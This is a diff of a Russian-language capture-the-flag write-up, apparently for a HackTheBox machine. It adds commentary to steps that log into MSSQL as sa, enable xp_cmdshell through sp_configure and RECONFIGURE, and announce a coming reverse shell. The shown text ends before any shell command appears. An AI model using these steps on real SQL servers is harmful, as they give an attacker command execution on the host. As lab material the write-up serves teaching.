@@ -238,6 +238,7 @@ MSSQL       10.10.11.51     1433   DC01             [+] DC01\sa:MSSQLP@***** (Pw
 MSSQL_PRIV  10.10.11.51     1433   DC01             [+] sa is already a sysadmin
 ```
 
+Мы можем увидеть, что у нас есть права **sysadmin**, `sa is already a sysadmin`, поэтому нас интересует `xp_cmdshell`, это расширенная хранимая процедура в Microsoft SQL Server, которая позволяет запускать операционные системные команды и выполнять их через SQL Server, таким образом, так как у нас есть права администратора базы данных, мы можем через неё выполнять различные вредоносные команды, в том числе **reverse shell**
 ```
 Hexada@hexada ~/app/escape-two$ mssqlclient.py sa@10.10.11.51 -p 1433                                                                                                               130 ↵  
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
@@ -254,6 +255,7 @@ Password:
 SQL (sa  dbo@master)>
 ```
 
+Чтоб активировать `xp_cmdshell`, нам нужно включить несколько пораметров у `sp_configure`. Конкретно эта комадна, включает отображение расширенных параметров конфигурации, в которые входит `xp_cmdshell`. Чтоб изменения в файлах конфигурации начали работать, нам так же нужно вписать еще команду `RECONFIGURE;`
 ```
 SQL (sa  dbo@msdb)> sp_configure 'show advanced options', 1;
 INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
@@ -261,12 +263,14 @@ INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' ch
 SQL (sa  dbo@msdb)> RECONFIGURE;
 ```
 
+Теперь, нам нужно включить поддержку расширенной хранимой процедуры `xp_cmdshell`
 ```
 SQL (sa  dbo@msdb)> sp_configure 'xp_cmdshell', 1;
 INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
 SQL (sa  dbo@msdb)> RECONFIGURE;
 ```
 
+После этого, мы можем включить `xp_cmdshell`, и у нас будет возможность выполнять **power shell* команды
 ```
 SQL (sa  dbo@msdb)> enable_xp_cmdshell
 INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
@@ -274,41 +278,7 @@ INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from
 SQL (sa  dbo@msdb)> RECONFIGURE
 ```
 
-```
-SQL (sa  dbo@msdb)> EXEC xp_cmdshell 'dir C:\';
-output                                                       
-----------------------------------------------------------   
- Volume in drive C has no label.                             
-
- Volume Serial Number is 3705-289D                           
-
-NULL                                                         
-
- Directory of C:\                                            
-
-NULL                                                         
-
-11/05/2022  11:03 AM    <DIR>          PerfLogs              
-
-01/04/2025  07:11 AM    <DIR>          Program Files         
-
-06/09/2024  07:37 AM    <DIR>          Program Files (x86)   
-
-06/08/2024  02:07 PM    <DIR>          SQL2019               
-
-06/09/2024  05:42 AM    <DIR>          Users                 
-
-01/04/2025  08:10 AM    <DIR>          Windows               
-
-               0 File(s)              0 bytes                
-
-               6 Dir(s)   3,701,399,552 bytes free           
-
-NULL                                                         
-
-SQL (sa  dbo@msdb)> 
-```
-
+Замечательно, теперь нам нужно получить доступ к хосту, с помощью **reverse shell**
 ```
 
 
